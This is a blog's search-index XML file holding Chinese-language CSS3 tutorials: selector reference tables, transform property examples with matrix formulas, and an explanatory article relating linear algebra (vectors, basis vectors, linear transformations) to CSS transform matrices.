<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>CSS3常见属性</title>
    <url>/2018/04/17/CSS3_CSS3%E5%B8%B8%E8%A7%81%E5%B1%9E%E6%80%A7/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CSS3</category>
      </categories>
      <tags>
        <tag>CSS3</tag>
        <tag>API</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS3-选择器整理</title>
    <url>/2018/04/17/CSS3_CSS3%E9%80%89%E6%8B%A9%E5%99%A8%E6%95%B4%E7%90%86/</url>
    <content><![CDATA[<h2 id="CSS选择器整理"><a href="#CSS选择器整理" class="headerlink" title="CSS选择器整理"></a>CSS选择器整理</h2><h4 id="基本选择器"><a href="#基本选择器" class="headerlink" title="基本选择器"></a>基本选择器</h4><table>
<thead>
<tr>
<th>选择器</th>
<th style="text-align:center">名称</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>*</td>
<td style="text-align:center">通配选择器</td>
<td style="text-align:left">选择文档中所有的HTML元素</td>
</tr>
<tr>
<td>E</td>
<td style="text-align:center">元素选择器</td>
<td style="text-align:left">选择指定类型的HTML元素，例如：li、p等等</td>
</tr>
<tr>
<td>#id</td>
<td style="text-align:center">ID 选择器</td>
<td style="text-align:left">选择ID属性值为 “id” 的元素</td>
</tr>
<tr>
<td>.class</td>
<td style="text-align:center">类选择器</td>
<td style="text-align:left">选择class属性值为 “class” 的一组元素</td>
</tr>
<tr>
<td>selector1, selector2</td>
<td style="text-align:center">群组选择器</td>
<td style="text-align:left">将每一个选择器匹配的集合合并</td>
</tr>
</tbody>
</table>
<h4 id="层次选择器"><a href="#层次选择器" class="headerlink" title="层次选择器"></a>层次选择器</h4><table>
<thead>
<tr>
<th>选择器</th>
<th style="text-align:center">名称</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>selector1 selector2</td>
<td style="text-align:center">后代选择器(包含选择器)</td>
<td style="text-align:left">选择selector2所匹配的一组元素，且selector2是selector1的后代元素</td>
</tr>
<tr>
<td>selector1 &gt; selector2</td>
<td style="text-align:center">子选择器</td>
<td style="text-align:left">选择selector2所匹配的一组元素，且selector2是selector1的直接子元素</td>
</tr>
<tr>
<td>selector1 + selector2</td>
<td style="text-align:center">相邻兄弟选择器</td>
<td style="text-align:left">选择selector2所匹配的元素，且selector2位于selector1的后面</td>
</tr>
<tr>
<td>selector1 ~ selector2</td>
<td style="text-align:center">通用选择器</td>
<td style="text-align:left">选择selector2所匹配的一组元素，且该组元素位于selector1后面</td>
</tr>
</tbody>
</table>
<h4 id="伪类选择器"><a href="#伪类选择器" class="headerlink" title="伪类选择器"></a>伪类选择器</h4><h5 id="动态伪类选择器"><a href="#动态伪类选择器" class="headerlink" title="动态伪类选择器"></a>动态伪类选择器</h5><table>
<thead>
<tr>
<th>选择器</th>
<th style="text-align:center">名称</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>selector:link</td>
<td style="text-align:center">连接伪类选择器</td>
<td style="text-align:left">选择selector所匹配的元素，且该元素被定义了超链接并未被访问过，常用于a标签</td>
</tr>
<tr>
<td>selector:visited</td>
<td style="text-align:center">连接伪类选择器</td>
<td style="text-align:left">选择selector所匹配的元素，且该元素被定义了超链接并已被访问过，常用于a标签</td>
</tr>
<tr>
<td>selector:active</td>
<td style="text-align:center">用户行为伪类选择器</td>
<td style="text-align:left">选择selector所匹配的元素，且该元素被激活，常用于连接或按钮上</td>
</tr>
<tr>
<td>selector:hover</td>
<td style="text-align:center">用户行为伪类选择器</td>
<td style="text-align:left">选择selector所匹配的元素，且用户鼠标停留在该元素上</td>
</tr>
<tr>
<td>selector:focus</td>
<td style="text-align:center">用户行为伪类选择器</td>
<td style="text-align:left">选择selector所匹配的元素，且该元素获得焦点</td>
</tr>
</tbody>
</table>
<h5 id="目标伪类选择器"><a href="#目标伪类选择器" class="headerlink" title="目标伪类选择器"></a>目标伪类选择器</h5><table>
<thead>
<tr>
<th>选择器</th>
<th style="text-align:center">名称</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>selector:target</td>
<td style="text-align:center">目标伪类选择器</td>
<td style="text-align:left">选择selector所匹配的元素，且该元素的ID值等于页面URL片段标识符(即#号后面的值)的值</td>
</tr>
</tbody>
</table>
<h5 id="语言伪类选择器"><a href="#语言伪类选择器" class="headerlink" title="语言伪类选择器"></a>语言伪类选择器</h5><table>
<thead>
<tr>
<th>选择器</th>
<th style="text-align:center">名称</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>selector:lang(language)</td>
<td style="text-align:center">语言伪类选择器</td>
<td style="text-align:left">选择selector所匹配的元素，且该元素指定了值为 language 的 lang 属性，多用于多语言网站不同样式的处理上</td>
</tr>
</tbody>
</table>
<h5 id="UI元素状态伪类选择器"><a href="#UI元素状态伪类选择器" class="headerlink" title="UI元素状态伪类选择器"></a>UI元素状态伪类选择器</h5><table>
<thead>
<tr>
<th>选择器</th>
<th style="text-align:center">名称</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>selector:checked</td>
<td style="text-align:center">选中状态伪类选择器</td>
<td style="text-align:left">匹配选中的单选按钮/复选按钮</td>
</tr>
<tr>
<td>selector:enabled</td>
<td style="text-align:center">启用状态伪类选择器</td>
<td style="text-align:left">选择selector所匹配的表单元素，其该元素为启用状态</td>
</tr>
<tr>
<td>selector:disabled</td>
<td style="text-align:center">禁用状态伪类选择器</td>
<td style="text-align:left">选择selector所匹配的表单元素，其该元素为禁用状态</td>
</tr>
</tbody>
</table>
<h5 id="结构伪类选择器"><a href="#结构伪类选择器" class="headerlink" title="结构伪类选择器"></a>结构伪类选择器</h5><table>
<thead>
<tr>
<th>选择器</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>selector:first-child</td>
<td style="text-align:center">选择selector所匹配的元素，且该元素是其父元素的第一个子元素(不算文本节点，也不区分元素类型)，等价于 selector:nth-child(1)</td>
</tr>
<tr>
<td>selector:last-child</td>
<td style="text-align:center">选择selector所匹配的元素，且该元素是其父元素的最后一个子元素(不算文本节点，也不区分元素类型)，等价于 selector:nth-last-child(1)</td>
</tr>
<tr>
<td>selector:nth-child(n)</td>
<td style="text-align:center">选择selector所匹配的元素，且该元素是其父元素的第n个子元素(不算文本节点，也不区分元素类型)，其中 n 的值可以使正数(1、2、3…)，也可以是关键字(even、odd)，也可以是公式(2n+1、2n-1…)，且 n 的起始值是1而不是0</td>
</tr>
<tr>
<td>selector:nth-last-child(n)</td>
<td style="text-align:center">选择selector所匹配的元素，且该元素是其父元素的倒数第n个子元素(不算文本节点，也不区分元素类型)</td>
</tr>
<tr>
<td>selector:first-of-type</td>
<td style="text-align:center">选择selector所匹配的元素，且该元素是其父元素的第一个特定类型的子元素(不算文本节点，区分元素类型)</td>
</tr>
<tr>
<td>selector:last-of-type</td>
<td style="text-align:center">选择selector所匹配的元素，且该元素是其父元素的最后一个特定类型的子元素(不算文本节点，区分元素类型)</td>
</tr>
<tr>
<td>selector:nth-of-type(n)</td>
<td style="text-align:center">选择selector所匹配的元素，且该元素是其父元素的第n个特定类型的子元素(不算文本节点，区分元素类型)</td>
</tr>
<tr>
<td>selector:nth-last-of-type(n)</td>
<td style="text-align:center">选择selector所匹配的元素，且该元素是其父元素的倒数第n个特定类型的子元素(不算文本节点，区分元素类型)</td>
</tr>
<tr>
<td>selector:only-child</td>
<td style="text-align:center">选择selector所匹配的元素，且其父元素只有它一个子元素(不算文本节点，也不区分元素类型)</td>
</tr>
<tr>
<td>selector:only-of-type</td>
<td style="text-align:center">选择selector所匹配的元素，且其父元素只有它一个特定类型的子元素(不算文本节点，区分元素类型)</td>
</tr>
<tr>
<td>selector:root</td>
<td style="text-align:center">选择selector所匹配的元素所在文档的根元素，即html元素</td>
</tr>
<tr>
<td>selector:empty</td>
<td style="text-align:center">选择selector所匹配的元素，且该元素没有任何子元素(包括文本节点)</td>
</tr>
</tbody>
</table>
<h5 id="否定伪类选择器"><a href="#否定伪类选择器" class="headerlink" title="否定伪类选择器"></a>否定伪类选择器</h5><table>
<thead>
<tr>
<th>选择器</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>selector1:not(selector2)</td>
<td style="text-align:center">选择所有不包含selector2的selector1元素</td>
</tr>
</tbody>
</table>
<h4 id="伪元素"><a href="#伪元素" class="headerlink" title="伪元素"></a>伪元素</h4><table>
<thead>
<tr>
<th>选择器</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>selector::first-letter</td>
<td style="text-align:center">选择文本块的第一个字母</td>
</tr>
<tr>
<td>selector::first-line</td>
<td style="text-align:center">选择文本块的第一行文本</td>
</tr>
<tr>
<td>selector::before</td>
<td style="text-align:center">用来为selector所匹配的元素的所有子元素前面插入内容，插入的内容不会成为DOM的一部分，但是依然可以设置样式</td>
</tr>
<tr>
<td>selector::after</td>
<td style="text-align:center">用来为selector所匹配的元素的所有子元素后面插入内容，插入的内容不会成为DOM的一部分，但是依然可以设置样式</td>
</tr>
<tr>
<td>selector::selection</td>
<td style="text-align:center">匹配被鼠标选中的文本</td>
</tr>
</tbody>
</table>
<p class="tip">双冒号代表伪元素，单冒号代表伪类</p>

<h4 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a>属性选择器</h4><table>
<thead>
<tr>
<th>选择器</th>
<th style="text-align:center">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>selector[attr]</td>
<td style="text-align:center">选择selector所匹配的元素，且该元素拥有attr属性。可以省略selector，表示匹配所有拥有attr属性的元素</td>
</tr>
<tr>
<td>selector[attr=val]</td>
<td style="text-align:center">选择selector所匹配的元素，且该元素拥有值为val的attr属性。可以省略selector，表示匹配所有拥有值为val的attr属性的元素</td>
</tr>
<tr>
<td>selector[attr~=val]</td>
<td style="text-align:center">选择selector所匹配的元素，且该元素attr属性值具有多个空格分隔的值，其中一个值等于val。可以省略selector</td>
</tr>
<tr>
<td>selector[attr*=val]</td>
<td style="text-align:center">选择selector所匹配的元素，且该元素attr属性值的任意位置包含val。可以省略selector</td>
</tr>
<tr>
<td>selector[attr^=val]</td>
<td style="text-align:center">选择selector所匹配的元素，且该元素attr属性值以val开头。可以省略selector</td>
</tr>
<tr>
<td>selector[attr$=val]</td>
<td style="text-align:center">选择selector所匹配的元素，且该元素attr属性值以val结尾。可以省略selector</td>
</tr>
</tbody>
</table>
<p>除了上表中介绍的属性选择器之外，还有一个属性选择器没有写在其中，如下：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 选择selector所匹配的元素，且该元素拥有值以val或val-开头的attr属性，可以省略selector */</span></span><br><span class="line"><span class="selector-tag">selector</span><span class="selector-attr">[attr|=val]</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>你可能会问我为什么没有这个选择器写在上面的表格中，是这样的，这个选择器中有字符 <code>|</code>，这个字符在markdown表格中是表格的分界线。日了狗了…..</p>
]]></content>
      <categories>
        <category>CSS3</category>
      </categories>
      <tags>
        <tag>CSS3</tag>
        <tag>API</tag>
      </tags>
  </entry>
  <entry>
    <title>移动端字体大小设置实战</title>
    <url>/2018/04/17/CSS3_%E7%A7%BB%E5%8A%A8%E7%AB%AF%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F%E8%AE%BE%E7%BD%AE%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CSS3</category>
      </categories>
      <tags>
        <tag>CSS3</tag>
        <tag>移动端</tag>
      </tags>
  </entry>
  <entry>
    <title>flex属性详解</title>
    <url>/2018/04/17/CSS3_flex%E5%B1%9E%E6%80%A7%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CSS3</category>
      </categories>
      <tags>
        <tag>CSS3</tag>
        <tag>API</tag>
        <tag>flex</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS3-transform属性详解</title>
    <url>/2018/04/17/CSS3_transform%E5%B1%9E%E6%80%A7%E8%AF%A6%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="transform-2D"><a href="#transform-2D" class="headerlink" title="transform 2D"></a>transform 2D</h2><h4 id="旋转"><a href="#旋转" class="headerlink" title="旋转"></a>旋转</h4><ul>
<li>单位：度数单位，常用角度(deg)</li>
<li>示例：<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">rotate</span>(20<span class="selector-tag">deg</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="斜切"><a href="#斜切" class="headerlink" title="斜切"></a>斜切</h4><ul>
<li>单位：度数单位，常用角度(deg)</li>
<li>示例：<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">skew</span>(20<span class="selector-tag">deg</span>, 40<span class="selector-tag">deg</span>);</span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">skewX</span>(20<span class="selector-tag">deg</span>);</span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">skewY</span>(20<span class="selector-tag">deg</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="缩放"><a href="#缩放" class="headerlink" title="缩放"></a>缩放</h4><ul>
<li>单位：倍数，无需指定单位</li>
<li>示例：<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">scale</span>(2, 1);</span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">scaleX</span>(2);</span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">scaleY</span>(2);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="位移"><a href="#位移" class="headerlink" title="位移"></a>位移</h4><ul>
<li>单位：长度单位，常用(px)</li>
<li>示例：<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">translate</span>(100<span class="selector-tag">px</span>, 100<span class="selector-tag">px</span>);</span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">translateX</span>(100<span class="selector-tag">px</span>);</span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">translateY</span>(100<span class="selector-tag">px</span>);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="transform-origin"><a href="#transform-origin" class="headerlink" title="transform-origin"></a>transform-origin</h4><ul>
<li>描述：设置变换基点</li>
<li>示例：<figure class="highlight"><table><tr><td class="code"><pre><span class="line">transform-origin: 关键字/百分比/距离单位;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p class="tip">坑点：通过js的方式来设置变换基点（dom.style.WebkitTransformOrigin = ‘0 0’;），不能快速同步给变换，在css中没问题</p>

<h4 id="执行顺序"><a href="#执行顺序" class="headerlink" title="执行顺序"></a>执行顺序</h4><p>先写后执行，应该说 先写的变换 会影响 后边的变换</p>
<h4 id="矩阵-matrix-a-b-c-d-e-f"><a href="#矩阵-matrix-a-b-c-d-e-f" class="headerlink" title="矩阵 matrix(a, b, c, d, e, f)"></a>矩阵 matrix(a, b, c, d, e, f)</h4><ul>
<li><p>默认值：matrix(1, 0, 0, 1, 0, 0)</p>
<p>  rotate / skew / scale / translate 等变换都是通过矩阵实现的，只不过是浏览器给我们封装好的函数</p>
</li>
<li><p>计算方法</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">x 轴位移：</span><br><span class="line">    e = e + x</span><br><span class="line">y 轴位移：</span><br><span class="line">    f = f + y</span><br><span class="line"></span><br><span class="line">x 轴斜切：</span><br><span class="line">    c = Math.tan(Math.PI / 180 * x)</span><br><span class="line">y 轴斜切：</span><br><span class="line">    b = Math.tan(Math.PI / 180 * y)</span><br><span class="line"></span><br><span class="line">x 轴缩放：</span><br><span class="line">    a = a * x</span><br><span class="line">    c = c * x</span><br><span class="line">    e = e * x</span><br><span class="line">y 轴缩放：</span><br><span class="line">    b = b * y</span><br><span class="line">    c = c * y</span><br><span class="line">    f = f * y</span><br><span class="line">旋转</span><br><span class="line">    a = Math.cos(Math.PI / 180 * deg)</span><br><span class="line">    b = Math.sin(Math.PI / 180 * deg)</span><br><span class="line">    c = -Math.sin(Math.PI / 180 * deg)</span><br><span class="line">    d = Math.cos(Math.PI / 180 * deg)</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="transform-3D"><a href="#transform-3D" class="headerlink" title="transform 3D"></a>transform 3D</h2><h4 id="perspective"><a href="#perspective" class="headerlink" title="perspective"></a>perspective</h4><ul>
<li>描述：设置景深</li>
<li>单位：无</li>
<li><p>示例：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">perspective</span>: 200;</span><br></pre></td></tr></table></figure>
</li>
<li><p>注意：该属性要加给需要做3D变换的父级元素</p>
</li>
</ul>
<h4 id="perspective-origin"><a href="#perspective-origin" class="headerlink" title="perspective-origin"></a>perspective-origin</h4><ul>
<li>描述：景深基点，可以理解为视线方向</li>
<li>示例：<figure class="highlight"><table><tr><td class="code"><pre><span class="line">perspective-origin: 关键字/距离单位;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="transform-style"><a href="#transform-style" class="headerlink" title="transform-style"></a>transform-style</h4><ul>
<li>描述：当元素做3D变换时是否保留子元素的3D变换</li>
<li>示例：<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform-style</span>: <span class="selector-tag">flat</span>; <span class="comment">/* 不保留 */</span></span><br><span class="line"><span class="selector-tag">transform-style</span>: <span class="selector-tag">preserve-3d</span>; <span class="comment">/* 保留 */</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="backface-visibility"><a href="#backface-visibility" class="headerlink" title="backface-visibility"></a>backface-visibility</h4><ul>
<li>描述：隐藏背面</li>
<li>示例：<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">backface-visibility</span>: <span class="selector-tag">visible</span>; <span class="comment">/* 可见 */</span></span><br><span class="line"><span class="selector-tag">backface-visibility</span>: <span class="selector-tag">hidden</span>; <span class="comment">/* 不可见 */</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="3D-旋转"><a href="#3D-旋转" class="headerlink" title="3D 旋转"></a>3D 旋转</h4><ul>
<li>单位：度数单位，常用角度(deg)</li>
<li>示例：<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 围绕Z轴旋转 */</span></span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">rotateZ</span>();</span><br><span class="line"><span class="comment">/* XYZ结合写法 */</span></span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">rotate3D</span>();</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="3D-位移"><a href="#3D-位移" class="headerlink" title="3D 位移"></a>3D 位移</h4><ul>
<li>单位：长度单位，常用单位(px)</li>
<li>示例：<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Z轴位移 */</span></span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">translateZ</span>();</span><br><span class="line"><span class="comment">/* XYZ结合写法 */</span></span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">translate3D</span>();</span><br></pre></td></tr></table></figure>
</li>
</ul>
]]></content>
      <categories>
        <category>CSS3</category>
      </categories>
      <tags>
        <tag>CSS3</tag>
        <tag>API</tag>
        <tag>transform</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS3-从矩阵和空间操作的关系理解CSS3的transform</title>
    <url>/2018/04/17/CSS3_%E4%BB%8E%E7%9F%A9%E9%98%B5%E5%92%8C%E7%A9%BA%E9%97%B4%E6%93%8D%E4%BD%9C%E7%9A%84%E5%85%B3%E7%B3%BB%E7%90%86%E8%A7%A3CSS3%E7%9A%84transform/</url>
    <content><![CDATA[<h2 id="从矩阵与空间操作的关系理解CSS3的transform"><a href="#从矩阵与空间操作的关系理解CSS3的transform" class="headerlink" title="从矩阵与空间操作的关系理解CSS3的transform"></a>从矩阵与空间操作的关系理解CSS3的transform</h2><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>矩阵，是线性代数中涉及的内容，线性代数在科学领域有很多应用的场景，如下：</p>
<p><img src="/static/img/use-the-scene.png" style="max-width: 500px;"></p>
<p>大部分同学在大学时期应该都学过一本叫做线性代数的书，如果没猜错的话，你们的老师在教学的时候大多都是概念性的灌输，比如矩阵乘法如何运算，加法如何运算，大家只要记住就ok了，但是大部分同学都不理解，<em>为什么矩阵的乘法要这样算？矩阵乘法的意义是什么？</em>，特别是我们搞计算机的，如果有做过 2D/3D 变换的同学一定听说过矩阵，比如在前端的CSS中，使用 <code>transform</code> 做 2D/3D 的变换，其中就应用到了矩阵的知识，这篇文章并不是一篇数学性质的文章，所以大家不要看了感觉一阵眩晕，这篇文章的目的在于：从矩阵与空间之间的关系讲述：为什么矩阵可以应用在空间操作(变换)。或者用一句大白话：<em>这玩意儿怎么就能让<code>div</code>翻过来，转过去，扭的他爹都不认识他的。</em></p>
<p>先看一段 css 代码：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 2D */</span></span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">matrix</span>(1, 0, 0, 1, 0, 0);</span><br><span class="line"><span class="comment">/* 3D */</span></span><br><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">matrix</span>(1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1);</span><br></pre></td></tr></table></figure>
<p>上面两行 css 代码其实什么变换都不会做，因为那是变换的默认状态，即没有变换。但是其中使用到了 <code>matrix</code>，翻译成中文叫做：矩阵。如果有深入研究过 css 的同学对这两行代码也许不陌生，但是大多数人在使用 <code>transform</code> 变换时很少直接使用 <code>matrix</code> 矩阵，除非你不想让人看懂你在做些什么鸟变换…，所以更多的时候，我们会使用类似如下语法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">transform</span>: <span class="selector-tag">translateX</span>(100<span class="selector-tag">px</span>) <span class="selector-tag">rotateZ</span>(30<span class="selector-tag">deg</span>);</span><br></pre></td></tr></table></figure>
<p>如上代码所示，一目了然，要做什么变换大家一看就知道了。但其实，这只是一个语法糖，其底层依然使用的是 <code>matrix</code>。</p>
<p>如果想要理解矩阵为何可以应用到 2D/3D 变换，那么只从数值水平的角度理解是不够的，你需要从几何的角度去理解矩阵，这存在着根本性的差异。而这，也就是本篇文章的真正意义。</p>
<p>不过，这需要我们先了解一些必要的基本概念，这些概念至关重要，首先就是向量</p>
<h2 id="向量"><a href="#向量" class="headerlink" title="向量"></a>向量</h2><h4 id="什么是向量"><a href="#什么是向量" class="headerlink" title="什么是向量"></a>什么是向量</h4><p>既然矩阵是线性代数的一部分，那么就不得不提到 <em>向量</em>，因为向量是线性代数最基础、最根源的组成部分，所以我们要先搞清楚，向量是什么？我说过，这篇文章不会很“数学”，所以大家不要被吓到。用一句话描述向量是什么：</p>
<blockquote>
<p>向量：空间中的箭头</p>
</blockquote>
<p>这个在大家的印象里应该很好理解，这个箭头由两个因素决定：<code>方向</code> 和 <code>长度</code>，我们先把目光局限在二维空间下，如图：</p>
<p><img src="/static/img/arrow.png" style="max-width: 500px;"></p>
<p>上图中，在一个坐标系中画了四个不同长度和方向的箭头，每个箭头从原点发出，他们代表了二维空间中的四个向量，在线性代数中，向量通常以原点作为起点。</p>
<p>如果你已经理解了“向量是空间中的箭头”这种观点，下面我们再进一步，我们重新用一句话来描述向量：</p>
<blockquote>
<p>向量：是有序的数字列表</p>
</blockquote>
<p>假设大家对坐标系的概念都有所了解，我们还是把目光局限在二维空间，在坐标系中任意选取单位长度，这样我们就能够使用一个一个的刻度来标刻这个坐标系，选取特定的方向为x/y轴的正方向，那么不难看出，每一个向量，都可以用唯一的一个坐标来表示，同样的，坐标系中的每一个坐标都对应着一个唯一的箭头(向量)，如下图：</p>
<p><img src="/static/img/number.png" style="max-width: 500px;"></p>
<p>在坐标系中，由于坐标通常用来标示一个点，如 <code>P(2, 8)</code> 表示点 P 的坐标为 <code>(2, 8)</code>，为了区分点和向量，在表示向量时，我们通常把坐标竖着写，然后用一对儿中括号来描述，如上图中的：</p>
<p><img src="/static/img/point.png" style="max-width: 500px;"></p>
<p>在三维空间也是一样的道理，如下图，我就不做重复的解释，唯一不同的是，每一个向量由 x/y/z 三个数字组成的坐标来表示：</p>
<p><img src="/static/img/3.png" style="max-width: 500px;"></p>
<p>对于向量，你只需要知道它是“空间中的箭头”或者“有序的数字列表”这就足够了，怎么样？不难理解吧，我们继续往下看，在坐标系中存在一种特殊的向量，我们称之为 <em>基向量</em>。</p>
<h4 id="基向量"><a href="#基向量" class="headerlink" title="基向量"></a>基向量</h4><p>基向量，也叫单位向量，是单位长度为1的向量，如下图中：<code>i帽</code> 和 <code>j帽</code> 就是这个二维坐标系的基向量：</p>
<p><img src="/static/img/ji-xl.png" style="max-width: 500px;"></p>
<p>对于向量，我们就先介绍到这里，这已经足够了。除了向量，还有一个概念需要大家了解，即线性变换。</p>
<h2 id="线性变换"><a href="#线性变换" class="headerlink" title="线性变换"></a>线性变换</h2><p>“变换”本质上是“函数”的一种花哨的叫法，玩编程的都知道函数，与在数学中的概念类似，函数接收输入的内容，并输出对应的结果，如图：</p>
<p><img src="/static/img/function.png" style="max-width: 500px;"></p>
<p>变换也是同样的道理，只不过接收向量作为输入，并输出变换后的向量：</p>
<p><img src="/static/img/transform.png" style="max-width: 500px;"></p>
<p>既然 “变换” 与 “函数” 本质相同，那么为什么叫变换而不叫函数呢？这实际上就暗示了我们，你可以把这个输入输出的过程，看做一个向量从初始状态到最终状态的一个变化过程，如下图：</p>
<p><img src="/static/img/input-output.png" style="max-width: 500px;"></p>
<p>现在，我们把情况宏观一下，目前只讨论一个向量的变换，我们知道，二维空间的一整个平面，可以看做是由无数个向量组成(或者无数个点组成，因为每一个点唯一标识一个向量，所以这里说平面由无数个向量组成)，假如这无数个向量同时做相同的变换，那其实就可以看做是平面的变换，如下图：</p>
<p>变换前：</p>
<p><img src="/static/img/before.png" style="max-width: 500px;"></p>
<p>变换后：</p>
<p><img src="/static/img/after.png" style="max-width: 500px;"></p>
<p>不过，并非所有变换都叫做线性变换，线性变换必须要满足下面两个条件：</p>
<ul>
<li>1、直线在变换后仍然为直线，不能有所弯曲</li>
<li>2、原点不能移动</li>
</ul>
<p>如下变换，就不是一个线性变换，因为直线变成了曲线：</p>
<p><img src="/static/img/wanqu.png" style="max-width: 500px;"></p>
<h2 id="如何用数值描述线性变换？"><a href="#如何用数值描述线性变换？" class="headerlink" title="如何用数值描述线性变换？"></a>如何用数值描述线性变换？</h2><p>在上一小节中我们知道，空间的变换也可以说是向量的变换，而向量在空间中，可以用一组有序的数字列表来表示(即向量的坐标)，所以向量变换前后，必然会引起“有序数字列表的变换”，那么我们是否可以用数字去描述变换呢？</p>
<p>之前在向量一节中，我们了解过<em>基向量</em>，单位长度为1，其实空间中的任意一个向量我们都可以看做是：<em>基向量变换后的和向量</em>，如下图：</p>
<p><img src="/static/img/he.png" style="max-width: 500px;"></p>
<p>向量 <b>v</b> 的坐标是 <img src="/static/img/zuobiao.png" style="max-width: 50px;">，如果我们把 <code>3</code> 和 <code>-2</code> 看做两个标量，也就是纯数字，那么向量  <b>v</b> 可以看做是基向量被标量缩放后相加得到的和向量： <b>v</b> = 3<b>i</b> + (-2<b>j</b>)</p>
<p>了解了这些，我们现在就通过一个例子，来认识一个至关重要的事实，假如我们有向量 <b>v</b> = -1<b>i</b> + 2<b>j</b>，如下图：</p>
<p><img src="/static/img/qian.png" style="max-width: 500px;"></p>
<p>此时，基向量 <b>i</b> 的坐标是 <code>(1, 0)</code>【注意：为了方便，这里就用圆括号代表向量的坐标，下同】，基向量 <b>j</b> 的坐标是 <code>(0, 1)</code>，假设经过了某些变换之后，基向量 <b>i</b> 的坐标变为 <code>(1， -2)</code>，基向量 <b>j</b> 的坐标变为 <code>(3， 0)</code>，如下图：</p>
<p><img src="/static/img/hou.png" style="max-width: 500px;"></p>
<p>那么变换后的向量 <b>v</b> 依然满足 <b>v</b> = -1<b>i</b> + 2<b>j</b>，如下：</p>
<p><img src="/static/img/hou-plus.png" style="max-width: 500px;"></p>
<p>以上例子所描述的事实，实际上是线性变换的性质的推论，该性质可以从几何角度表述为：线性变换后的网格平行且等距。</p>
<p>既然线性变换前后都满足该线性关系：<b>v</b> = -1<b>i</b> + 2<b>j</b></p>
<p>那么很容易根据变换后 <code>i帽</code> 和 <code>j帽</code> 的坐标推算出变换后 <b>v</b> 的坐标：</p>
<p><img src="/static/img/jisuan.png" style="max-width: 500px;"></p>
<p>也就是 <code>(5, 2)</code>，即：<img src="/static/img/zuobiao2.png" style="max-width: 50px;"></p>
<p>那么我们是否可以认为，给定任意一个向量，其坐标 <code>(x, y)</code>，我们可以通过变换后的基向量的坐标推断出该向量变换后的坐标呢？答案是肯定的，假如基向量变换后的坐标 <code>i帽</code> 和 <code>j帽</code> 如下图：</p>
<p><img src="/static/img/bianhuan2.png" style="max-width: 200px;"></p>
<p>那么任意向量 <code>(x, y)</code> 在经过变换后的坐标计算如下：</p>
<p><img src="/static/img/zuobiao3.png" style="max-width: 300px;"></p>
